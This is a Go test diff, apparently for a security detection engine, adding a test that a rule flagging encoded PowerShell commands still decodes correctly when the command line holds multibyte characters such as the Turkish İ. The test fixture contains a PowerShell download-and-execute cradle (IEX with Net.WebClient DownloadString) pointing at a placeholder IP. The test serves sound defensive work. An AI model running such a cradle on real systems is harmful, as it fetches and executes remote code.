@@ -139,3 +139,15 @@ func hexOf(s string) string {
 	}
 	return string(b)
 }
+
+// 命令行中有转小写后字节长度会变化的字符（如土耳其语的 İ）时，编码参数照样解码，不会越界。
+func TestEncodedPSUnicode(t *testing.T) {
+	enc := psEncode("IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/a')")
+	ev := &model.Event{Kind: model.KindProcess, SrcIP: "10.0.0.12", SubjectHost: true, Proc: &model.ProcInfo{Op: "process",
+		Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CommandLine: "powershell.exe -w İİİİ hidden -EncodedCommand " + enc}}
+	e, _ := NewEngine("", 0)
+	h := hasRule(e.Inspect(ev), "proc-ps-encoded")
+	if h == nil || h.Severity != model.SevCritical || !strings.Contains(h.Evidence, "DownloadString") {
+		t.Fatalf("含多字节字符的命令行: %+v", h)
+	}
+}
